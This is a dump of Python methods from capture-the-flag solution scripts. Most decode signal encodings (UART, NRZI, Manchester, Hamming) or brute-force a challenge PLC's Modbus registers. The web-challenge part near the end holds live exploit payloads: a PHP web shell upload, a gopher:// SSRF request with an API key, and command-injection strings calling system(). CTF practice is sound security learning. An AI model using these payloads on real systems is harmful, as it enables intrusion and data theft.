                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        self.requests.append(round_text)
        print(self.requests)
        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrz_i(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        decoded = self.ascii_converter(decoded)
        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_02.py
    def main(self):

        self.requests = []

        text = &#34;011011101110000100111001000010010011111011110000&#34;
        decoded = self.decode_nrz_i(text)
        decoded = self.ascii_converter(decoded)

        text = &#34;100110010110101000011000111110011000101010&#34;
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)
        # return

        text = &#34;0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011&#34;
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)

        #

        text = &#34;001101010010100001101100011011001&#34;
        text = &#34;01110110011&#34;
        start = time.time()
        # text = &#34;01010111011010000010010101011000101110110011000001010010011011101101111011001&#34;
        test = &#34;0110001100101110111001011101110010110001100100000101001&#34;
        decoded = self.decode_uart(text)

        decoded = self.ascii_converter(decoded)
        print(f&#34;time: {time.time() - start} - Decoded: {decoded}&#34;)
        # print(decoded)

        # return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def ascii_converter(self, bits: str) -&gt; str:
        return &#34;&#34;.join(
            chr(int(bits[i : i + 8], 2))
            for i in range(0, len(bits), 8)
            if len(bits[i : i + 8]) == 8
        )

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_nrz_i(self, bits: str) -&gt; str:
        result = &#34;&#34;
        current = &#34;0&#34;
        for bit in bits:
            if bit == &#34;1&#34;:
                current = &#34;1&#34; if current == &#34;0&#34; else &#34;0&#34;
            result += current
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_manchester(self, bits: str) -&gt; str:
        raw_bits = &#34;&#34;
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;10&#34;:
                raw_bits += &#34;1&#34;
            elif pair == &#34;01&#34;:
                raw_bits += &#34;0&#34;
            else:
                raise ValueError(f&#34;Invalid Manchester encoding: {pair}&#34;)
        return raw_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_hamming74(self, bits: str) -&gt; str:
        result = &#34;&#34;
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) &lt; 7:
                continue
            b = list(map(int, chunk))
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 &lt;&lt; 1) + (p3 &lt;&lt; 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1
            result += &#34;&#34;.join(str(b[i]) for i in [2, 4, 5, 6])
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def decode_uart(self, bits: str) -&gt; str:
        # Try all possible alignments
        for offset in range(10):
            candidate = bits[offset:]
            result = &#34;&#34;
            for i in range(0, len(candidate), 10):
                frame = candidate[i : i + 10]
                if len(frame) != 10:
                    continue
                if frame[0] != &#34;0&#34; or frame[-1] != &#34;1&#34;:
                    continue
                data_bits = frame[1:9]
                byte = int(data_bits[::-1], 2)
                result += chr(byte)

        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        print(round_text)
        round_text = round_text.decode().strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        if len(round_text) &lt; 2:
            sys.exit(0)  # Unexpected round format or missing data
        protocol = round_text[1]
        bits = round_text[2]

        if protocol == &#34;[UART&#34;:
            decoded = self.decode_uart(bits)
        else:
            match protocol:
                case &#34;[NRZI&#34;:
                    raw_bits = self.decode_nrz_i(bits)
                case &#34;[Manchester&#34;:
                    raw_bits = self.decode_manchester(bits)
                case &#34;[Hamming74&#34;:
                    raw_bits = self.decode_hamming74(bits)
                case _:
                    raise ValueError(f&#34;Unknown encoding type: {protocol}&#34;)
            decoded = self.ascii_converter(raw_bits)

        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/chat.py
    def main(self):
        self.initiate_connection()
        self.recv_lines(27, display=False)

        for _ in range(100):
            self.getting_round()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def ascii_converter1(self, bits: str) -&gt; str:
        # Step 2: Convert bitstream to ASCII
        ascii_text = &#34;&#34;
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            if len(byte) == 8:
                ascii_text += chr(int(byte, 2))
        return ascii_text

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def ascii_converter(self, bits):
        &#34;&#34;&#34;
        Convert a string of bits to ASCII characters.
        Input bits should be in multiples of 8 (for standard ASCII).
        Handles padding if needed.
        &#34;&#34;&#34;
        # Pad with zeros if not multiple of 8
        padded_length = math.ceil(len(bits) / 8) * 8
        padded_bits = bits.ljust(padded_length, &#34;0&#34;)

        ascii_str = &#34;&#34;
        for i in range(0, len(padded_bits), 8):
            byte = padded_bits[i : i + 8]
            try:
                char = chr(int(byte, 2))
                # Only add printable ASCII characters
                if 32 &lt;= ord(char) &lt;= 126 or ord(char) in [10, 13]:
                    ascii_str += char
                else:
                    ascii_str += &#34;.&#34;  # Non-printable character placeholder
            except ValueError:
                ascii_str += &#34;?&#34;  # Invalid byte

        return ascii_str

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_nrz_i(self, bits: str) -&gt; str:
        # result = &#34;&#34;
        # current = &#34;0&#34;
        # for bit in bits:
        #     if bit == &#34;1&#34;:
        #         # toggle the signal
        #         current = &#34;1&#34; if current == &#34;0&#34; else &#34;0&#34;
        #     # bit == &#34;0&#34; means no change
        #     result += current
        # return result
        &#34;&#34;&#34;
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        &#34;&#34;&#34;
        if not bits:
            return &#34;&#34;

        decoded = []
        prev_bit = &#34;1&#34;  # Start with high voltage as reference

        for bit in bits:
            if bit == prev_bit:
                decoded.append(&#34;0&#34;)
            else:
                decoded.append(&#34;1&#34;)
            prev_bit = bit

        return &#34;&#34;.join(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_manchester(self, bits: str) -&gt; str:
        # Step 1: Decode Manchester pairs to raw bits
        raw_bits = &#34;&#34;
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;10&#34;:
                raw_bits += &#34;1&#34;
            elif pair == &#34;01&#34;:
                raw_bits += &#34;0&#34;
            else:
                raise ValueError(f&#34;Invalid Manchester encoding: {pair}&#34;)

        return raw_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_hamming74(self, bits: str) -&gt; str:
        result = &#34;&#34;
        for i in range(0, len(bits), 7):
            chunk = bits[i : i + 7]
            if len(chunk) &lt; 7:
                continue  # ignore incomplete chunks
            b = list(map(int, chunk))
            # Parity check positions
            p1 = b[0] ^ b[2] ^ b[4] ^ b[6]
            p2 = b[1] ^ b[2] ^ b[5] ^ b[6]
            p3 = b[3] ^ b[4] ^ b[5] ^ b[6]
            error_pos = p1 + (p2 &lt;&lt; 1) + (p3 &lt;&lt; 2)
            if error_pos != 0:
                b[error_pos - 1] ^= 1  # fix error
            # Extract data bits: positions 3,5,6,7 -&gt; indices 2,4,5,6
            result += &#34;&#34;.join(str(b[i]) for i in [2, 4, 5, 6])
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def decode_uart(self, bits, baud_rate=9600):
        &#34;&#34;&#34;
        Decode UART (Universal Asynchronous Receiver-Transmitter) encoded bits.
        UART uses start/stop bits and sends LSB first with no clock signal.
        Assumes 8 data bits, 1 start bit (0), 1 stop bit (1), no parity.
        &#34;&#34;&#34;
        if len(bits) &lt; 10 or bits[0] != &#34;0&#34;:
            return &#34;&#34;  # Invalid UART frame

        char_bits = []
        # Extract the 8 data bits (bits 1-8)
        data_bits = bits[1:9]
        # UART sends LSB first, so we need to reverse
        data_bits = data_bits[::-1]
        char_int = int(data_bits, 2)

        try:
            return chr(char_int)
        except ValueError:
            return &#34;&#34;

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        print(round_text)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrz_i(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        decoded = self.ascii_converter(decoded)
        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_01.py
    def main(self):

        text = &#34;011011101110000100111001000010010011111011110000&#34;
        decoded = self.decode_nrz_i(text)
        decoded = self.ascii_converter(decoded)

        text = &#34;100110010110101000011000111110011000101010&#34;
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)
        # return

        text = &#34;0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011&#34;
        decoded = self.decode_hamming74(text)
        decoded = self.ascii_converter(decoded)

        #

        text = &#34;001101010010100001101100011011001&#34;
        start = time.time()
        text = &#34;01010111011010000010010101011000101110110011000001010010011011101101111011001&#34;
        decoded = self.decode_uart(text)

        decoded = self.ascii_converter(decoded)
        print(f&#34;time: {time.time() - start}&#34;)
        # print(decoded)

        return

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            self.getting_round()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def saving_requests(self):
        &#34;&#34;&#34;
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        &#34;&#34;&#34;

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) &gt; 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;r&#34;) as f:
            requests = json.load(f)
        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;w&#34;) as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f&#34;Saved {len(self.requests)} requests to data/requests.json&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def nrzi_formater_for_rest(self, bits: list):
        # padded_length = math.ceil(len(bits) / 8) * 8
        last_bits = len(bits) % 8
        if last_bits == 0:
            return bits

        valid_bits = bits[: len(bits) - last_bits]
        rest_of_bits = bits[len(bits) - last_bits :]
        print(
            f&#34;Valid bits: {valid_bits}, Rest of bits: {rest_of_bits}, Last bits: {last_bits}&#34;
        )
        rest_of_bits = [0] * (8 - last_bits) + rest_of_bits
        # Pad with zeros to make it a multiple of 8
        print(f&#34;Rest of bits: {rest_of_bits}&#34;)

        return valid_bits + rest_of_bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def nrzi_formater(self, bits: list):
        bits = [0] * (len(bits) % 8) + bits
        return bits

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def bits_to_ascii(self, bits):
        &#34;&#34;&#34;
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        &#34;&#34;&#34;
        if len(bits) % 8 != 0:
            # Pad with zeros if not multiple of 8
            raise ValueError(&#34;Number of bits is not a multiple of 8&#34;)
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val &lt;&lt; 1) | bit
            chars.append(chr(val))
        return &#34;&#34;.join(chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_nrzi(self, bits: str) -&gt; str:
        &#34;&#34;&#34;
        Decode NRZ-I (Non-Return-to-Zero Inverted) encoded bits.
        In NRZ-I, a transition (0 to 1 or 1 to 0) represents a 1,
        and no transition represents a 0.
        &#34;&#34;&#34;

        # Convert string to list of ints
        encoded_bits = list(map(int, bits))
        # Initial signal level
        current_level = encoded_bits[0]
        decoded_bits = []
        decoded_bits.append(current_level)
        for i in range(1, len(encoded_bits)):
            if encoded_bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        # print(f&#34;Decoded NRZI bits: {decoded_bits}&#34;)
        # print(&#34;&#34;.join([str(bit) for bit in decoded_bits]))
        # decoded_bits = self.nrzi_formater(decoded_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_manchester(self, encoded_bits):
        &#34;&#34;&#34;
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        &#39;01&#39; -&gt; 0
        &#39;10&#39; -&gt; 1
        &#34;&#34;&#34;
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError(&#34;Manchester encoded bits length must be even&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;01&#34;:
                decoded_bits.append(0)
            elif pair == &#34;10&#34;:
                decoded_bits.append(1)
            else:
                raise ValueError(f&#34;Invalid Manchester encoding pair: {pair}&#34;)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_hamming74(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        &#34;&#34;&#34;

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 &lt;&lt; 2) | (s2 &lt;&lt; 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError(&#34;Hamming (7,4) encoded bits length must be multiple of 7&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=1, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - 1 parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        self.requests.append(round_text)
        # print(self.requests)
        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_04.py
    def main(self):

        self.requests = []

        # text = &#34;011011101110000100111001000010010011111011110000&#34;
        # text = &#34;001011111001100110010011100000111010010110100011&#34;
        # text = &#34;010010000110001110110000&#34;
        # text = &#34;100010001010101000&#34;
        # decoded_result = &#34;110110101010101011&#34;
        # text = &#34;001000111000100001001010&#34;
        # decoded = self.decode_nrzi(text)
        # print(decoded)

        # return
        # text = &#34;100110010110101000011000111110011000101010&#34;
        # decoded = self.decode_hamming74(text)
        # # return

        # text = &#34;0001011100101010111011010001100110101100100100111001001011000110010111001101100001101011&#34;
        # decoded = self.decode_hamming74(text)

        # #

        # text = &#34;001101010010100001101100011011001&#34;
        # text = &#34;01110110011&#34;
        # start = time.time()
        # # text = &#34;01010111011010000010010101011000101110110011000001010010011011101101111011001&#34;
        # test = &#34;0110001100101110111001011101110010110001100100000101001&#34;

        # print(f&#34;time: {time.time() - start} - Decoded: {decoded}&#34;)
        # # print(decoded)

        # test = &#34;01110011011000001010010111011100100010011011000010110110010110100100101111011&#34;
        # 0 11100110 1 1
        # 0 00001010 0 1
        # 0 11101110 0 1
        # 0 00100110 1 1
        # 0 00010110 1 1
        # 0 01011010 0 1
        # 0 01011110 1 1

        # for i in range(len(test) // 11):
        #     print(
        #         f&#34;start: {test[i*11]} | bits: {test[i*11 + 1:(i*11)+8 + 1]} | parity: {test[i*11 + 9 ]} | stop: {test[i*11 + 10]}&#34;
        #     )

        self.initiate_connection()
        self.recv_lines(27, display=False)

        for i in range(99):
            try:
                self.getting_round()
            except Exception as e:
                self.saving_requests()
                print(f&#34;Error in round {i}: {e}&#34;)
                break

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Blackjack/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def initiate_connection(self):
        self.client = ModbusTcpClient(self.url, port=self.port)
        self.client.connect()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def bruteforce_address(self, start=0, number=1000, count=125, verbose=False):
        if start &gt; number:
            raise ValueError(
                &#34;Start address must be less than the number of addresses to check.&#34;
            )
        for i in range(start, number):
            result = self.client.read_holding_registers(address=i, count=count)

            if any(result.registers) and result.registers[-1] == 0:
                return i
            if verbose:
                print(f&#34;Reading holding registers at address {i}...&#34;)
                if not result.isError():
                    print(&#34;Registers:&#34;, result.registers)
                else:
                    print(&#34;Error reading registers:&#34;, result)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def get_registers(self, address, count=125):
        result = self.client.read_holding_registers(address=address, count=count)
        if not result.isError():
            return result.registers
        else:
            print(&#34;Error reading registers:&#34;, result)
            return None

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/solution.py
    def main(self):
        self.initiate_connection()
        address = self.bruteforce_address(verbose=True)
        print(address)  # 935
        registers = self.get_registers(address)
        flag = &#34;&#34;.join(chr(r) for r in registers if r != 0)
        print(flag)
        self.client.close()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def socket_initiate_connection(self):

        with socket.create_connection((self.url, self.port), timeout=10) as s:
            # Receive initial banner or prompt
            data = s.recv(4096)
            print(&#34;Received:&#34;, data.decode(errors=&#34;ignore&#34;))

            # Example: send a newline or command if required by the challenge
            s.sendall(b&#34;\n&#34;)
            response = s.recv(4096)
            print(&#34;Response:&#34;, response.decode(errors=&#34;ignore&#34;))

            # Try common commands if it&#39;s a text interface
            for cmd in [b&#34;status\n&#34;, b&#34;secret\n&#34;, b&#34;help\n&#34;, b&#34;info\n&#34;]:
                s.sendall(cmd)
                resp = s.recv(4096)
                print(f&#34;Sent {cmd.strip().decode()}: {resp.decode(errors=&#39;ignore&#39;)}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def plc_initiate_connection(self):
        # try:
        with LogixDriver(&#34;challenge.hackthat.site/55373&#34;) as plc:
            print(&#34;Connected to PLC&#34;)
            tag_value = plc.read(&#34;Flag&#34;)
            print(f&#34;Flag value: {tag_value}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def snap_initiate_connection(self):
        self.client = Client()
        self.client.connect(self.url, self.port)
        result = self.client.read_area(
            area=snap7_util.snap7.types.Areas.DB, db_number=1, start=0, size=100
        )
        print(result)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def plc_work(self, solution, plc):

        print(plc.get_tags())

        return

        tag = LogixTag(name=&#34;Flag&#34;, tag_type=LogixTagType.STRING)
        plc.add_tag(tag)

        # Read the flag from the PLC
        flag = plc.read(&#34;Flag&#34;)
        if flag:
            print(f&#34;Flag: {flag.value}&#34;)
        else:
            print(&#34;Failed to read the flag from PLC&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Holding_Secrets/payloads/attempt_01.py
    def main(self):
        self.plc_initiate_connection()

        # /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def __init__(self, conn: str, file: str, url: str, port: str, **args):
        super().__init__(conn, file, url, port)
        self.pwn.context.log_level = &#34;error&#34;
        self.ip = args.HOST
        self.rpc_port = args.RPC_PORT
        self.tcp_port = args.TCP_PORT
        self.RPC_URL = f&#34;http://{self.ip}:{int(self.rpc_port)}/&#34;
        self.tcp_url = f&#34;{self.ip}:{int(self.tcp_port)}&#34;

        # /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def main(self):

        # self.initiate_connection()

        connection_info = {}

        # connect to challenge handler and get connection info
        with self.pwn.remote(
            self.TCP_URL.split(&#34;:&#34;)[0], int(self.TCP_URL.split(&#34;:&#34;)[1])
        ) as p:
            p.sendlineafter(b&#34;action? &#34;, b&#34;1&#34;)
            data = p.recvall()

        lines = data.decode().split(&#34;\n&#34;)
        for line in lines:
            if line:
                key, value = line.strip().split(&#34; :  &#34;)
                connection_info[key] = value

        print(connection_info)
        self.pvk = connection_info[&#34;Private key    &#34;]
        self.setup = connection_info[&#34;Setup contract &#34;]
        target = connection_info[&#34;Target contract&#34;]

        while True:
            # try luck
            self.csend(target, &#34;pullTrigger()&#34;)

            # get flag
            with self.pwn.remote(
                self.TCP_URL.split(&#34;:&#34;)[0], int(self.TCP_URL.split(&#34;:&#34;)[1])
            ) as p:
                p.recvuntil(b&#34;action? &#34;)
                p.sendline(b&#34;3&#34;)
                flag = p.recvall().decode()

            if &#34;HTB&#34; in flag:
                print(f&#34;\n\n[*] {flag}&#34;)
                break

        # /home/figaro/CTF/Categories/Blockchain/HTB/Russian_Roulette/payloads/solution.py
    def csend(self, contract: str, fn: str, *args):
        print(
            f&#34;cast send {contract} &#39;{fn}&#39; --rpc-url  {self.RPC_URL} --private-key {self.pvk}&#34;
        )
        system(
            f&#34;cast send {contract} &#39;{fn}&#39; --rpc-url {self.RPC_URL} --private-key {self.pvk}&#34;
        )

        # /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def reconstructing_url(self):
        self.complete_url = f&#34;http://{self.url}:{self.port}&#34;

        # /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def send_file(self, file):
        url = self.complete_url + &#34;/upload&#34;
        with open(file, &#34;rb&#34;) as f:
            files = {&#34;file&#34;: f}
            response = requests.post(url, files=files)
        if response.status_code == 200:
            return response.json()
        else:
            return response.text

        # /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def get_request(self, path):
        url = &#34;/&#34;.join([self.complete_url, path])
        response = requests.get(url)
        if response.status_code == 200:
            # return response.json()
            return response.text
        else:
            return response.text

        # /home/figaro/CTF/Categories/Web/picoCTF/Trickster/payloads/solution.py
    def main(self):
        self.reconstructing_url()
        # robots = self.get_request(&#34;robots.txt&#34;)
        # print(robots)
        # instructions = self.get_request(&#34;instructions.txt&#34;)
        # print(instructions)
        payload = self.Path(self.folder_payloads, &#34;webshell.png.php&#34;)
        self.send_file(payload)

        # /home/figaro/CTF/Categories/Web/bsides/PageOneHTML/payloads/solution.py
    def main(self):

        url = &#34;http://94.237.59.174:59356/api/convert&#34;
        headers = {&#34;Content-Type&#34;: &#34;application/json&#34;}
        data = {
            # &#34;markdown_content&#34;: &#34;![flag](gopher://127.0.0.1:80/_GET /api/dev HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aX-Api-Key:934caf984a4ca94817ea6d87d37af4b3%0d%0a%0d%0a)&#34;,
            # &#34;markdown_content&#34;: &#34;![test](http://127.0.0.1/)&#34;,
            &#34;markdown_content&#34;: &#34;![flag](gopher://127.0.0.1:80/_GET%20/api/dev%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aX-Api-Key:934caf984a4ca94817ea6d87d37af4b3%0d%0a%0d%0a)&#34;,
            &#34;port_images&#34;: True,
        }

        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 200:
            print(&#34;Request successful!&#34;)
            print(response.json())
        else:
            print(f&#34;Request failed with status code: {response.status_code}&#34;)
            print(response.text)

        # /home/figaro/CTF/Categories/Web/bsides/SimPlay/payloads/solution.py
    def main(self):
        url = f&#34;http://{self.url}:{self.port}&#34;  # Replace with actual challenge IP or domain
        payload = &#39;Y-m-d&#34;; system(&#34;cat /www/flag&#34;); //&#39;
        payload = &#39;Y-m-d&#34;); system(&#34;ls /&#34;); //&#39;
